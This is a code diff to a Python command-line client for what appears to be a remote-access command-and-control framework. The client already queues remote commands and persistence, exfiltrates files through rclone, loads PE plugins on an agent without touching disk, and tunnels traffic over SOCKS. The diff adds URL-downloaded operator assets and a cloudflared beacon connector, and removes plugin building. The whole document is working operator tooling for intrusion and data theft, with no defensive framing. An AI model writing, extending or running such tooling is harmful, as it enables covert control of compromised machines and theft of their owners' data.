@@ -25,6 +25,7 @@ import sys
 import threading
 import time
 import urllib.error
+import urllib.parse
 import urllib.request
 from pathlib import Path
 
@@ -57,6 +58,8 @@ RMM_CLI_COMMANDS = [
     "download",
     "exfil",
     "rclone-config",
+    "assets",
+    "profile",
     "upload",
     "screenshot",
     "pe",
@@ -218,6 +221,45 @@ class RmmApiClient:
     def get_rclone_config(self):
         return self.request("GET", "/api/v1/rclone/config")
 
+    def list_assets(self, kind: str | None = None):
+        """List dynamic operator assets, optionally filtered by kind."""
+        path = "/api/v1/assets" if not kind else f"/api/v1/assets/{kind}"
+        return self.request("GET", path)
+
+    def add_asset(self, kind: str, url: str, name: str | None = None, enabled: bool = True):
+        """Download and install one dynamic operator asset from a URL."""
+        body = {"url": url, "enabled": bool(enabled)}
+        if name:
+            body["name"] = name
+        return self.request("POST", f"/api/v1/assets/{kind}", body)
+
+    def set_asset_enabled(self, kind: str, name: str, enabled: bool):
+        """Enable or disable one managed operator asset."""
+        return self.request("PATCH", f"/api/v1/assets/{kind}/{urllib.parse.quote(name)}", {"enabled": bool(enabled)})
+
+    def remove_asset(self, kind: str, name: str):
+        """Remove one managed operator asset."""
+        return self.request("DELETE", f"/api/v1/assets/{kind}/{urllib.parse.quote(name)}")
+
+    def profile_status(self):
+        """Return dynamic profile and beacon transport status."""
+        return self.request("GET", "/api/v1/profile")
+
+    def start_profile(self, name: str = "", config: dict | None = None):
+        """Start one installed RMM-Profile."""
+        body = {"name": name}
+        if config:
+            body["config"] = config
+        return self.request("POST", "/api/v1/profile", body, timeout=45)
+
+    def stop_profile(self):
+        """Stop the active RMM-Profile."""
+        return self.request("POST", "/api/v1/profile", {"stop": True})
+
+    def get_transport(self):
+        """Return administration and beacon URLs."""
+        return self.request("GET", "/api/v1/transport")
+
     def queue_screenshot(self, session_id: str):
         return self.request(
             "POST",
@@ -228,18 +270,22 @@ class RmmApiClient:
     def list_plugins(self):
         return self.request("GET", "/api/v1/plugins")
 
-    def queue_pe_load(self, session_id: str, plugin: str, export: str = "Run", plugin_input: str = ""):
+    def queue_pe_load(
+        self,
+        session_id: str,
+        plugin: str,
+        export: str = "Run",
+        plugin_input: str = "",
+        command: str | None = None,
+    ):
+        body = {"plugin": plugin, "export": export, "input": plugin_input}
+        if command:
+            body["command"] = command
         return self.request(
             "POST",
             f"/api/v1/sessions/{session_id}/pe",
-            {"plugin": plugin, "export": export, "input": plugin_input},
+            body,
         )
-
-    def build_plugin(self, name: str, output: str | None = None):
-        body = {"name": name}
-        if output:
-            body["output"] = output
-        return self.request("POST", "/api/v1/plugins/build", body)
 
     def start_socks(self, session_id: str, port: int = 1080, bind_host: str = "127.0.0.1"):
         return self.request(
@@ -688,6 +734,7 @@ def cmd_pe_load(client: RmmApiClient, state: dict, args):
         args.plugin,
         export=getattr(args, "export", "Run"),
         plugin_input=getattr(args, "input", ""),
+        command=getattr(args, "command", None),
     )
     if code != 200:
         die(f"pe load queue failed ({code}): {data}")
@@ -699,32 +746,18 @@ def cmd_pe_list(client: RmmApiClient, state: dict, args):
     if code != 200:
         die(f"plugin list failed ({code}): {data}")
     plugins = data.get("plugins", []) if isinstance(data, dict) else []
-    targets = data.get("targets", []) if isinstance(data, dict) else []
-    toolchain = data.get("toolchain", {}) if isinstance(data, dict) else {}
     if not plugins:
-        print("No PE plugins found in the server plugin directory")
+        print("No agent plugins found in the runtime plugin store")
     for plugin in plugins:
         print(f"{plugin.get('name')}  {plugin.get('size')} bytes  sha256={plugin.get('sha256')}")
-    if targets:
-        print(f"Build targets on server: {', '.join(targets)}")
-    if toolchain and not toolchain.get("cross_compiler"):
-        print(f"Warning: cross compiler {toolchain.get('cross_compiler_name')} is missing on the server — plugin builds unavailable")
-    if toolchain and not toolchain.get("go"):
-        print("Warning: Go toolchain is missing on the server — plugin builds unavailable")
-
-
-def cmd_pe_build(client: RmmApiClient, state: dict, args):
-    code, data = client.build_plugin(args.plugin_name, getattr(args, "output", None))
-    if code != 200:
-        die(f"plugin build failed ({code}): {data}")
-    print(f"Built {data.get('output')} ({data.get('size')} bytes, sha256={data.get('sha256')}) into the server plugin directory")
 
 
 def _print_rclone_config(data: dict) -> None:
     if data.get("load_error"):
         print(f"Profile load error: {data['load_error']}")
     bin_ok = "yes" if data.get("rclone_binary") else "no"
-    print(f"Upload from: agent  rclone on server: {bin_ok}  max_bytes: {data.get('max_bytes')}")
+    scope = "workspace" if data.get("workspace_local") else "server"
+    print(f"Upload from: agent  rclone bootstrap ({scope}): {bin_ok}  max_bytes: {data.get('max_bytes')}")
     print(f"Default profile: {data.get('default_profile')}")
     profiles = data.get("profiles") or []
     if not profiles:
@@ -744,6 +777,69 @@ def cmd_rclone_config(client: RmmApiClient, state: dict, args):
         print(json.dumps(data, indent=2))
         return
     _print_rclone_config(data)
+
+
+def cmd_assets(client: RmmApiClient, state: dict, args):
+    """List, download, toggle, or remove dynamic operator assets."""
+    action = getattr(args, "assets_cmd", "list")
+    kind = getattr(args, "kind", None)
+    if action == "list":
+        code, data = client.list_assets(kind)
+        if code != 200:
+            die(f"asset list failed ({code}): {data}")
+        if getattr(args, "json", False):
+            print(json.dumps(data, indent=2))
+            return
+        rows = data.get("assets", []) if isinstance(data, dict) else []
+        if not rows:
+            print("No managed assets")
+        for row in rows:
+            state_text = "enabled" if row.get("enabled", True) else "disabled"
+            print(f"{row.get('kind')}/{row.get('name')}  {state_text}  {row.get('size', '?')} bytes")
+        return
+    if action == "add":
+        code, data = client.add_asset(args.kind, args.url, args.name, not args.disabled)
+        if code not in (200, 201):
+            die(f"asset download failed ({code}): {data}")
+        print(json.dumps(data, indent=2) if getattr(args, "json", False) else f"Installed {args.kind} asset from {args.url}")
+        return
+    if action in {"enable", "disable"}:
+        code, data = client.set_asset_enabled(args.kind, args.name, action == "enable")
+        if code != 200:
+            die(f"asset update failed ({code}): {data}")
+        print(json.dumps(data, indent=2) if getattr(args, "json", False) else f"{action.title()}d {args.kind}/{args.name}")
+        return
+    if action == "remove":
+        code, data = client.remove_asset(args.kind, args.name)
+        if code != 200:
+            die(f"asset removal failed ({code}): {data}")
+        print(json.dumps(data, indent=2) if getattr(args, "json", False) else f"Removed {args.kind}/{args.name}")
+        return
+    die(f"unknown asset action: {action}")
+
+
+def cmd_profile(client: RmmApiClient, state: dict, args):
+    """Inspect or control the active RMM-Profile connector."""
+    action = getattr(args, "profile_cmd", "status")
+    if action == "status":
+        code, data = client.profile_status()
+    elif action == "start":
+        code, data = client.start_profile(args.name)
+    elif action == "stop":
+        code, data = client.stop_profile()
+    else:
+        die(f"unknown profile action: {action}")
+    if code not in (200, 201):
+        die(f"profile {action} failed ({code}): {data}")
+    if getattr(args, "json", False):
+        print(json.dumps(data, indent=2))
+        return
+    if action == "status":
+        profile = data.get("active") if isinstance(data, dict) else None
+        print(f"Profile: {(profile or {}).get('name') or 'none'}")
+        print(f"Beacon URL: {data.get('beacon_public_url') or data.get('public_url') or 'not connected'}")
+    else:
+        print(f"Profile {action} requested")
 
 
 def cmd_upload(client: RmmApiClient, state: dict, args):
@@ -904,8 +1000,8 @@ Session:  list | use <id> | info | background | kill [id]
 Beacon:   set_sleep <seconds> | set_jitter <percent> | show_config
 Remote:   <command>  (queue) | exec <command>  (wait) | persist <cmd> | stop
 Files:    download <remote> | exfil <remote> [profile] | upload <local> <remote> | screenshot
-Plugins: pe list | pe build <plugin> [output.dll] | pe <plugin> [export] [input]   (diskless PE load on the Go agent)
-Config:   rclone-config   (rclone profiles + binary status on server)
+Plugins: pe list | pe <plugin> [export] [input]   (diskless PE load; use --command for plugin-owned dispatch)
+Config:   rclone-config   (rclone profiles + bootstrap status)
 Tunnel:   socks list | socks [port] | socks stop   (SOCKS5 on 127.0.0.1, default 1080)
           tun list | tun start <session> <device> | tun stop <session>
 Other:    events [since] | health | help | quit
@@ -1313,7 +1409,7 @@ def run_interactive(
                     if data.get("rclone_binary"):
                         say(f"rclone binary ready; default profile={data.get('default_profile')}")
                     else:
-                        warn("rclone.exe not on server — see tools/rclone/README.md")
+                        warn("rclone bootstrap is unavailable — see docs/rclone-exfil.md")
                     for p in data.get("profiles") or []:
                         say(f"  {p.get('name')} ({p.get('type')}) folder={p.get('folder') or '/'}")
                 continue
@@ -1354,25 +1450,9 @@ def run_interactive(
                     else:
                         for plugin in data.get("plugins", []):
                             say(f"{plugin.get('name')}  {plugin.get('size')} bytes  sha256={plugin.get('sha256')}")
-                        if data.get("targets"):
-                            say(f"Build targets: {', '.join(data['targets'])}")
-                        toolchain = data.get("toolchain", {})
-                        if toolchain and not toolchain.get("cross_compiler"):
-                            warn(f"cross compiler {toolchain.get('cross_compiler_name')} missing on server — plugin builds unavailable")
-                    continue
-                if rest and rest[0].lower() == "build":
-                    if len(rest) < 2:
-                        warn("Usage: pe build <plugin> [output.dll]")
-                        continue
-                    output_name = rest[2] if len(rest) > 2 else None
-                    code, data = client.build_plugin(rest[1], output_name)
-                    if code == 200:
-                        say(f"Built {data.get('output')} ({data.get('size')} bytes, sha256={data.get('sha256')})")
-                    else:
-                        warn(f"plugin build failed ({code}): {data}")
                     continue
                 if not rest:
-                    warn("Usage: pe <plugin> [export] [input] | pe list | pe build <plugin> [output.dll]")
+                    warn("Usage: pe <plugin> [export] [input] | pe list")
                     continue
                 sid = session_or_none(state)
                 if not sid:
@@ -1700,7 +1780,7 @@ def build_parser() -> argparse.ArgumentParser:
 
     sp_exfil = sub.add_parser("exfil", help="Queue remote file exfil via rclone (agent-side upload)")
     sp_exfil.add_argument("remote_path")
-    sp_exfil.add_argument("--profile", "-p", default=None, help="Named rclone profile on server")
+    sp_exfil.add_argument("--profile", "-p", default=None, help="Named rclone profile in the active deployment")
     sp_exfil.add_argument("--dest", default=None, help="Cloud destination path override")
     sp_exfil.add_argument("--mode", choices=("auto", "plugin", "binary"), default="auto", help="Execution mode")
     sp_exfil.add_argument("--session", "-s", default=None)
@@ -1715,19 +1795,48 @@ def build_parser() -> argparse.ArgumentParser:
     sp_pe_load = sp_pe_sub.add_parser("load", parents=[shared], help="Queue a PE plugin load on the agent")
     sp_pe_load.add_argument("plugin")
     sp_pe_load.add_argument("--export", default="Run", help="Plugin export to call (default Run)")
+    sp_pe_load.add_argument(
+        "--command",
+        default=None,
+        help="Plugin-owned command dispatched by the plugin Run export",
+    )
     sp_pe_load.add_argument("input", nargs="?", default="", help="Optional input passed to the export")
     sp_pe_load.add_argument("--session", "-s", default=None)
     sp_pe_load.set_defaults(func=cmd_pe_load)
-    sp_pe_build = sp_pe_sub.add_parser(
-        "build", parents=[shared], help="Cross-compile a checked-in Go plugin on the server"
-    )
-    sp_pe_build.add_argument("plugin_name", help="Checked-in plugin target (see pe list)")
-    sp_pe_build.add_argument("--output", default=None, help="Output DLL name (default <plugin>.dll)")
-    sp_pe_build.set_defaults(func=cmd_pe_build)
-
-    sp_rcfg = sub.add_parser("rclone-config", help="Show rclone profiles and binary status on server")
+    sp_rcfg = sub.add_parser("rclone-config", help="Show rclone profiles and bootstrap status")
     sp_rcfg.add_argument("--json", action="store_true", help="JSON output")
     sp_rcfg.set_defaults(func=cmd_rclone_config)
+
+    sp_assets = sub.add_parser("assets", help="Manage URL-installed profiles, plugins, skills, and rclone files")
+    sp_assets_sub = sp_assets.add_subparsers(dest="assets_cmd", required=True)
+    sp_assets_list = sp_assets_sub.add_parser("list", parents=[shared], help="List managed assets")
+    sp_assets_list.add_argument("kind", nargs="?", choices=["plugins", "skills", "rclone"])
+    sp_assets_list.set_defaults(func=cmd_assets)
+    sp_assets_add = sp_assets_sub.add_parser("add", parents=[shared], help="Download an asset from a URL")
+    sp_assets_add.add_argument("kind", choices=["plugins", "skills", "rclone"])
+    sp_assets_add.add_argument("url")
+    sp_assets_add.add_argument("--name", default=None, help="Override the filename derived from the URL")
+    sp_assets_add.add_argument("--disabled", action="store_true", help="Install without enabling the asset")
+    sp_assets_add.set_defaults(func=cmd_assets)
+    for action, enabled in (("enable", True), ("disable", False)):
+        parser_asset = sp_assets_sub.add_parser(action, parents=[shared], help=f"{action.title()} an asset")
+        parser_asset.add_argument("kind", choices=["plugins", "skills", "rclone"])
+        parser_asset.add_argument("name")
+        parser_asset.set_defaults(func=cmd_assets, asset_enabled=enabled)
+    sp_assets_remove = sp_assets_sub.add_parser("remove", parents=[shared], help="Remove a managed asset")
+    sp_assets_remove.add_argument("kind", choices=["plugins", "skills", "rclone"])
+    sp_assets_remove.add_argument("name")
+    sp_assets_remove.set_defaults(func=cmd_assets)
+
+    sp_profile = sub.add_parser("profile", help="Manage the dynamic RMM-Profile connector")
+    sp_profile_sub = sp_profile.add_subparsers(dest="profile_cmd", required=True)
+    sp_profile_status = sp_profile_sub.add_parser("status", parents=[shared], help="Show profile and beacon URL")
+    sp_profile_status.set_defaults(func=cmd_profile)
+    sp_profile_start = sp_profile_sub.add_parser("start", parents=[shared], help="Start an installed profile")
+    sp_profile_start.add_argument("name", nargs="?", default="cloudflared")
+    sp_profile_start.set_defaults(func=cmd_profile)
+    sp_profile_stop = sp_profile_sub.add_parser("stop", parents=[shared], help="Stop the active profile")
+    sp_profile_stop.set_defaults(func=cmd_profile)
 
     sp_ul = sub.add_parser("upload", help="Upload local file to remote path")
     sp_ul.add_argument("local")
